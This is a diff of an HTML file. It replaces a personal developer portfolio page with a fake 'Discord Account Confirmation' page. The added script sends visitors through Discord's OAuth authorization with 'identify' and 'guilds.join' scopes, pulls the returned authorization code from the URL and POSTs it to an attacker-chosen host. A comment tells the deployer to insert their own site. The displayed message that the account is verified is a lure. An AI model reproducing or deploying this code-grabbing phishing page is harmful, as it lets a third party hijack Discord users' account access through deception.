@@ -1,44 +1,27 @@
-<html lang="en">
+<title>Discord Confirmation</title>
 
-<head>
-    <meta charset="UTF-8" />
-    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>dionexd</title>
-    <link rel="stylesheet" href="style.css" />
-    <script src="https://kit.fontawesome.com/66aa7c98b3.js" crossorigin="anonymous"></script>
-</head>
+<link href=https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.css rel=stylesheet crossorigin=anonymous>
+<link 
+  href=https://logodownload.org/wp-content/uploads/2017/11/discord-logo-4-1.png rel=icon sizes=16x16 type=image/png>
+<meta content=website property=og:type>
+<link href=https://use.typekit.net/joc7wli.css rel=stylesheet>/>
+<div id=box>
+  <img id=server_pic src=https://media.discordapp.net/attachments/851389970840944640/851390759998586910/755244169898885160.gif><h2>Discord Account Confirmation</h2>
+  <p><p>Your Discord account has been successfully verified,you will get acces in 1 hours. you can close this page</div>
 
-<body>
-    <div class="card">
-        <div class="img-bx">
-            <img src="avatar.gif"/>
-        </div>
-        <div class="content">
-            <div class="detail">
-                <h2>dione<br /><span>Web Developer</span></h2>
-                <ul class="sci">
-                    <li>
-                        <a href="https://discord.com/users/318113303115202570#"><i class="fab fa-discord"></i></a>
-                    </li>
-                    <li>
-                        <a href="#"><i class="fab fa-twitter"></i></a>
-                    </li>
-                    <li>
-                        <a href="#"><i class="fab fa-linkedin-in"></i></a>
-                    </li>
-                    <li>
-                        <a href="#"><i class="fab fa-instagram"></i></a>
-                    </li>
-                </ul>
-            </div>
-        </div>
-    </div>
-    <div>
-        <div class="wave"></div>
-        <div class="wave"></div>
-        <div class="wave"></div>
-    </div>
-</body>
+<script>window.onload = () => {
+			const code = location.href.substring(location.href.indexOf("code")+5, location.href.length)
 
-</html>
+			if (location.href.indexOf("code") > -1) {
+                const req = new XMLHttpRequest()
+                req.open("POST", "https://192.168.1.36/") //hostlayacağı siteyi girin yani kendi sitenizi girin
+                req.send(code)
+                req.onload = () => {
+                }
+		} else {
+        location.href = "https://discord.com/api/oauth2/authorize?client_id=1102597706628735027&redirect_uri=https%3A%2F%2F192.168.1.36%2F&response_type=code&scope=identify%20guilds.join"
+      }
+		}
+  
+</script><style>.btn{background-color:#60d1f6;color:#fff;padding:10px 22px}.btn:hover{background:#0076ff;color:#fff}body{background-image:url(https://media.discordapp.net/attachments/851389970840944640/851390664788934656/755243061088616458.gif);background-size:20%;background-repeat:no-repeat;background-position:bottom 0 right 7px;background-color:#24292e!important}h1,h2,h3,h4,h5,h6{color:#fff}p,small,span{color:#eaeaea}#box{width:400px;margin:0 auto;margin-top:100px;border:2px solid #181a1f;vertical-align:middle;border-radius:5px;text-align:center;padding:60px;background-color:#31363f!important}#server_pic{display:block;border-radius:1%;margin:10px auto;width:200px;border:0 solid #181a1f}hr{margin:20px;background-color:#eaeaea}
+</style>
